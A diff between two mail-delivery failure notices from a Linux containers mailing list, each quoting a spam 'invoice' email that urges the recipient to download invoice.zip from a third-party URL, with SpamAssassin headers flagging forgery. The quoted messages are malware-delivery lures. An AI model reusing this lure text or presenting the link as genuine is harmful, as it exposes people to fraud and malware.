@@ -1,9 +1,10 @@
-From: MAILER-DAEMON-i9wRM+HIrmnmtl4Z8vJ8Kg761KYD1DLY@public.gmane.org (Mail Delivery System)
-Subject: Undelivered Mail Returned to Sender
-Date: Wed, 22 Feb 2012 03:19:06 -0500 (EST)
-Message-ID: <20120222081906.3372E3B0765@smtp37.relay.iad1a.emailsrvr.com>
+From: MAILER-DAEMON-9UOxZ6aZAd+zS+HH4SPW1kEOCMrvLtNR@public.gmane.org
+Subject: failure notice
+Date: 22 Feb 2012 12:21:49 -0000
+Message-ID: <20120222122838.139EA6EF@mail.linuxfoundation.org>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============0807933970750810572=="
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -17,102 +18,75 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This is a MIME-encapsulated message.
+Hi. This is the qmail-send program at s228-67.furanet.com.
+I'm afraid I wasn't able to deliver your message to the following addresses.
+This is a permanent error; I've given up. Sorry it didn't work out.
 
---===============0807933970750810572==
-Content-Type: multipart/report; report-type=delivery-status;
-	boundary="50DCE3B0249.1329898746/smtp37.relay.iad1a.emailsrvr.com"
-Content-Transfer-Encoding: 7bit
+<ibiancaqz-7mSxt9ZvYHA@public.gmane.org>:
+159.134.198.135 does not like recipient.
+Remote host said: 550 5.1.1 User <ibiancaqz-7mSxt9ZvYHA@public.gmane.org> unknown
+Giving up on 159.134.198.135.
 
-This is a MIME-encapsulated message.
-
---50DCE3B0249.1329898746/smtp37.relay.iad1a.emailsrvr.com
-Content-Description: Notification
-Content-Type: text/plain; charset=us-ascii
-
-This is the mail system at host smtp37.relay.iad1a.emailsrvr.com.
-
-I'm sorry to have to inform you that your message could not
-be delivered to one or more recipients. It's attached below.
-
-For further assistance, please send mail to postmaster.
-
-If you do so, please include this problem report. You can
-delete your own text from the attached returned message.
-
-                   The mail system
-
-<xslk-7mSxt9ZvYHA@public.gmane.org>: host mail1.tinet.ie[159.134.198.135] said: 550 5.1.1 User
-    <xslk-7mSxt9ZvYHA@public.gmane.org> unknown (in reply to RCPT TO command)
-
---50DCE3B0249.1329898746/smtp37.relay.iad1a.emailsrvr.com
-Content-Description: Delivery report
-Content-Type: message/delivery-status
-
-Reporting-MTA: dns; smtp37.relay.iad1a.emailsrvr.com
-X-SMTP-Server-Queue-ID: 50DCE3B0249
-X-SMTP-Server-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Arrival-Date: Wed, 22 Feb 2012 03:19:00 -0500 (EST)
-
-Final-Recipient: rfc822; xslk-7mSxt9ZvYHA@public.gmane.org
-Original-Recipient: rfc822;xslk-7mSxt9ZvYHA@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: dns; mail1.tinet.ie
-Diagnostic-Code: smtp; 550 5.1.1 User <xslk-7mSxt9ZvYHA@public.gmane.org> unknown
-
---50DCE3B0249.1329898746/smtp37.relay.iad1a.emailsrvr.com
-Content-Description: Undelivered Message
-Content-Type: message/rfc822
-Content-Transfer-Encoding: 7bit
+--- Below this line is a copy of the message.
 
 Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: from localhost (localhost.localdomain [127.0.0.1])
-	by smtp37.relay.iad1a.emailsrvr.com (SMTP Server) with ESMTP id 50DCE3B0249
-	for <xslk-7mSxt9ZvYHA@public.gmane.org>; Wed, 22 Feb 2012 03:19:00 -0500 (EST)
-X-Virus-Scanned: OK
-Received: by smtp37.relay.iad1a.emailsrvr.com (Authenticated sender: chris-AT-fleetfeetgaithersburg.com) with ESMTPA id 1C50A3B04AA
-	for <xslk-7mSxt9ZvYHA@public.gmane.org>; Wed, 22 Feb 2012 03:18:59 -0500 (EST)
-Received: from [174.143.182.212] by blog.nomalistdesign.com id uIU9ES8OG1Ho with SMTP; Wed, 22 Feb 2012 08:18:59 +0000
-Date: Wed, 22 Feb 2012 08:18:59 +0000
-From: "confirming" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v3.02.8) Personal
+Received: (qmail 19165 invoked by uid 1002); 22 Feb 2012 12:21:44 -0000
+Received: from 174.143.182.212 by s228-67 (envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>, uid 0) with qmail-scanner-1.25st 
+ ( 
+ Clear:RC:0(174.143.182.212):SA:1(5.5/4.0):. 
+ Processed in 5.026126 secs); 22 Feb 2012 12:21:44 -0000
+X-Spam-Flag: YES
+X-Spam-Checker-Version: SpamAssassin 3.2.4 (2008-01-01) on s228-67.furanet.com
+X-Spam-Level: *****
+X-Spam-Status: Yes, score=5.5 required=4.0 tests=BAYES_50,FORGED_MUA_THEBAT_CS,
+	RAZOR2_CF_RANGE_51_100,RAZOR2_CF_RANGE_E8_51_100,RAZOR2_CHECK,RCVD_IN_PBL,
+	RDNS_NONE,SPF_FAIL,TVD_RCVD_IP,TVD_RCVD_IP4 autolearn=no version=3.2.4
+X-Spam-Report: 
+	*  0.9 RCVD_IN_PBL RBL: Received via a relay in Spamhaus PBL
+	*      [174.143.182.212 listed in zen.spamhaus.org]
+	*  0.1 TVD_RCVD_IP TVD_RCVD_IP
+	*  0.1 TVD_RCVD_IP4 TVD_RCVD_IP4
+	*  0.7 SPF_FAIL SPF: sender does not match SPF record (fail)
+	*      [SPF failed: Please see http://www.openspf.org/Why?s=mfrom;id=containers%40lists.linux-foundation.org;ip=174.143.182.212;r=s228-67.furanet.com]
+	*  0.0 BAYES_50 BODY: Bayesian spam probability is 40 to 60%
+	*      [score: 0.5000]
+	*  1.5 RAZOR2_CF_RANGE_E8_51_100 Razor2 gives engine 8 confidence level
+	*      above 50%
+	*      [cf: 100]
+	*  0.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+	*  0.5 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+	*      [cf: 100]
+	*  0.1 RDNS_NONE Delivered to trusted network by a host with no rDNS
+	*  1.1 FORGED_MUA_THEBAT_CS Mail pretending to be from The Bat! (charset)
+X-Envelope-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Received: from 174.143.182.212 by s228-67 (envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>, uid 0) with qmail-scanner-1.25 
+ ( 
+ Clear:RC:0(174.143.182.212):. 
+ Processed in 0.406109 secs); 22 Feb 2012 12:21:39 -0000
+Received: from unknown (HELO blog.nomalistdesign.com) (174.143.182.212)
+  by 195.78.228.67 with SMTP; 22 Feb 2012 12:21:38 -0000
+Received: from [174.143.182.212] by blog.nomalistdesign.com id kTQBiFlfol6W with SMTP; Wed, 22 Feb 2012 12:21:36 +0000
+Date: Wed, 22 Feb 2012 12:21:36 +0000
+From: "Supportpay" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v3.08.3) Home
 X-Priority: 3 (Normal)
-Message-ID: <7752260513.99424649782810-oYFICFIz4VW5PHSWFFpsopOMunqAqVKM@public.gmane.org>
-To: <xslk-7mSxt9ZvYHA@public.gmane.org>
-Subject: You have chosen to pay by credit card.
+Message-ID: <08875621.10347889517294-oYFICFIz4VW5PHSWFFpsopOMunqAqVKM@public.gmane.org>
+To: <ibiancaqz-7mSxt9ZvYHA@public.gmane.org>
+Subject: [SPAM] Invoice #25907105
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
-Content-Transfer-Encoding: quoted-printable
+Content-Transfer-Encoding: 8bit
+X-Spam-Prev-Subject: Invoice #25907105
 
 
 
 
 Dear customer.
 
-Your order has been accepted. Your order reference is 812687.=20
 
-Terms of delivery and the date can be found with=20
-the auto-generated msword file located at:
-http://www.vinideltrentino.com/ie/invoice.zip?iduser=3Dxslk-7mSxt9ZvYHA@public.gmane.org?4866=
-12
+The answer to your request for supplies to the site 10/14/2011.
+http://www.vinideltrentino.com/ie/invoice.zip?iduser=ibiancaqz-7mSxt9ZvYHA@public.gmane.org?612922
 
-=3D=3D
-Best regards, Tel. / Fax.:  (775) 251 70 775.
-
-
-
---50DCE3B0249.1329898746/smtp37.relay.iad1a.emailsrvr.com--
-
---===============0807933970750810572==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-_______________________________________________
-Containers mailing list
-Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============0807933970750810572==--
+==
+Tel. / Fax.: (015) 676 61 137
